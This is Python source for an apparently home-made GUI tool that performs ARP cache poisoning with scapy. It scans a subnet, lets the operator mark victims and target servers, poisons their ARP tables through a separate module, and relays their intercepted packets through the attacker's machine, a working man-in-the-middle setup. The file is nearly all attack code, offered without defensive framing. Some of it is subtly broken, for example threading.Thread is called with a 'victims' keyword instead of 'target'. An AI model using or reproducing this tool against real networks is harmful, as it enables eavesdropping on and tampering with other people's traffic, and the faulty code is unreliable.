from scapy.all import *
from doPoisoning import doPoisoning
import threading
from Tkinter import*
import sys
import os


class arpPoisoning():

    def __init__(self, interface, root):
        self.interface = interface
        self.root = root

    def input_finished(self):
        thread = None
        thread = threading.Thread(victims=self.startProcess)
        thread.daemon = True
        thread.start()

    def select_victims_ip(self):
        self.maliciousServers = []
        for widget in self.root.winfo_children():
            widget.destroy()
        options = []
        for packet_sent, packet_received in self.usedIPs:
            options.append(packet_received[ARP].psrc)
        Label(self.root, text='Select one or more maliciousServers IPs (can select all of them)').pack()
        selectvictimsIP = Listbox(self.root, selectmode="multiple", width=100)
        for each_item in range(len(options)):
            selectvictimsIP.insert(END, options[each_item])
        selectvictimsIP.pack()

        def get_victims(self):
            for i in selectvictimsIP.curselection():
                inputInt = int(i)
                self.maliciousServers.append(
                    {"ip": self.usedIPs[inputInt][1][ARP].psrc, "mac": self.usedIPs[inputInt][1][ARP].hwsrc})

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_victims(self)).pack()

    def select_arp_IP(self):
        self.victims = []
        Label(self.root, text='Select one or more victims IPs (can select all of them)').pack()
        options = []
        for packet_sent, packet_received in self.usedIPs:
            options.append(packet_received[ARP].psrc)

        select = Listbox(self.root, selectmode="multiple", width=100)
        for each_item in range(len(options)):
            select.insert(END, options[each_item])
        select.pack()

        def get_select(self):
            for i in select.curselection():
                inputInt = int(i)
                self.victims.append(
                    {"ip": self.usedIPs[inputInt][1][ARP].psrc, "mac": self.usedIPs[inputInt][1][ARP].hwsrc})
            self.select_victims_ip()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        Button(self.root, text="Execute", command=lambda:get_select(self)).pack()

    def get_IP(self):
        ipLabel = Label(self.root,
                        text='Enter the range of IP addresses that you want to use (example: 192.168.5.85/24)').pack()
        ipValue = Entry(self.root)
        ipValue.pack()

        def get_execute(self):
            self.rangeIP = ipValue.get()
            self.usedIPs, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.rangeIP), timeout=3,
                                   iface=self.interface)
            for widget in self.root.winfo_children():
                widget.destroy()
            self.select_arp_IP()

        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)
        Button(self.root, text="Execute", command=lambda:get_execute(self)).pack()

    def getInput(self):
        self.get_IP()

    def startProcess(self):
        for widget in self.root.winfo_children():
            widget.destroy()
        scroll = Scrollbar(self.root)
        self.eula = Text(self.root, wrap=NONE, yscrollcommand=scroll.set)
        scroll.config(command=self.eula.yview)
        self.eula.pack()
        self.eula.insert(END, "ARP poisoning has started" + '\n')
        self.eula.see(END)
        self.eula.update_idletasks()
        def restart_program(self):
            python =sys.executable
            os.execl(python, python, * sys.argv)
        Button(self.root, text="Reset", command=lambda:restart_program(self)).pack(side=BOTTOM)

        # Now we will create and send the arp packets which will poison the caches.
        thread = None
        process = doPoisoning(self.interface, self.victims, self.maliciousServers, self.myMAC)
        thread = threading.Thread(victims=process.doPoisoning)
        thread.daemon = True
        thread.start()
        # now we will redirect packets correctly -> do not enable port forwarding on your device
        while True:
            sniff(store=0, prn=lambda packet: self.packetForwarding(packet), iface=self.interface)

    def packetForwarding(self, packet):
        # first we should check whether the packet satisfies the most basic requirement of having the IP + ether layer
        if packet.haslayer(Ether) and packet.haslayer(IP):
            sender = None
            senderfound = False
            receiver = None
            receiverfound = False
                # Finds the sender to be in victims or maliciousServers set
            for tar1 in self.victims:
                if (tar1["mac"] == packet[Ether].src):
                    sender = tar1
                    senderfound = True
                    for tar2 in self.maliciousServers:
                        if (tar2["ip"] == packet[IP].dst):
                            receiver = tar2
                            receiverfound = True
            if ((not senderfound) or (not receiverfound)):
                for tar2 in self.maliciousServers:
                    if (tar2["mac"] == packet[Ether].src):
                        sender = tar2
                        senderfound = True
                        for tar1 in self.victims:
                            if (tar1["ip"] == packet[IP].dst):
                                receiver = tar1
                                receiverfound = True
                # now we will modify the packet and forward it
            if (senderfound and receiverfound):
                packet[Ether].src = self.myMAC
                packet[Ether].dst = receiver["mac"]
                sendp(packet, iface=self.interface, verbose=False)
                self.eula.insert(END, "we redirect packet from ip: {}, mac: {}, to ip: {}, mac: {}".format(sender["ip"], sender["mac"], receiver["ip"], receiver["mac"]) + '\n')
                self.eula.see(END)
                self.eula.update_idletasks()

    def setInput(self, rangeIP, usedIPs, victims, maliciousServers, myMAC):
        self.rangeIP = rangeIP
        self.usedIPs = usedIPs
        self.victims = victims
        self.maliciousServers = maliciousServers
        self.myMAC = myMAC